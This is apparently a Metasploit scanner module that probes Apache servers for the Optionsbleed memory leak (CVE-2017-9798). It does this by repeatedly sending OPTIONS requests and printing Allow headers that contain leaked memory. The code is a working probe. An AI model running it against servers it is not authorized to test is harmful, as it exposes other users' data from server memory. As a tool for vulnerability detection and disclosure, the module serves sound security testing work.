##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache Optionsbleed Scanner',
      'Description' => %q{
        This module scans for the Apache optionsbleed vulnerability where the Allow
        response header returned from an OPTIONS request may bleed memory if the
        server has a .htaccess file with an invalid Limit method defined.
      },
      'Author' => [
        'Hanno Böck', # Vulnerability discovery
        'h00die', # Metasploit module
      ],
      'References' => [
        [ 'CVE', '2017-9798' ],
        [ 'EDB', '42745' ],
        [ 'URL', 'https://github.com/hannob/optionsbleed' ],
        [ 'URL', 'https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html' ]
      ],
      'DisclosureDate' => 'Sep 18 2017',
      'License' => MSF_LICENSE,
      'Notes' =>
          {
              'AKA' => ['Optionsbleed']
          }
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI to the folder with the vulnerable .htaccess file', '/']),
      OptInt.new('REPEAT', [true, 'Times to attempt', 40]),
      OptBool.new('BUGS', [true, 'Print if any other Allow header bugs are found', true])
    ])
  end

  def get_allow_header(ip)
    res = send_request_raw({
      'version' => '1.1',
      'method'  => 'OPTIONS',
      'uri'     => datastore['TARGETURI']
    }, 10)

    fail_with(Failure::Unreachable, "#{peer} - Failed to respond") unless res
    fail_with(Failure::UnexpectedReply, "#{peer} - No Allow header identified") unless res.headers['Allow']
    res.headers['Allow']
  end

  def run_host(ip)
    # Apache bug 61207 regex
    bug_61207 = /^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$/
    # Launchpad bug 1717682 regex
    bug_1717682 = /^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$/
    uniques = []
    already_reported = false

    for counter in 1..datastore['REPEAT']
      allows = get_allow_header(ip)
      next if uniques.include?(allows) # no need to re-process non-new items
      uniques << allows
      if allows =~ bug_61207
        if allows.split(',').length > allows.split(',').uniq.length # check for repeat items
          print_status('Some methods were sent multiple times in the list. ' +
                       'This is a bug, but harmless. It may be Apache bug #61207.') if datastore['BUGS']
        else
          vprint_status("Request #{counter}: [Standard Response] -> #{allows}")
        end
      elsif allows =~ bug_1717682 && datastore['BUGS']
        print_status('The list of methods was space-separated instead of comma-separated. ' +
                     'This is a bug, but harmless. It may be Launchpad bug #1717682.')
      else
        print_good("Request #{counter}: [OptionsBleed Response] -> #{allows}")
      end
      next unless already_reported
        report_vuln(
          :host => ip,
          :port => rport,
          :name => self.name,
          :refs => self.references
        )
        already_reported = true
    end
  end
end
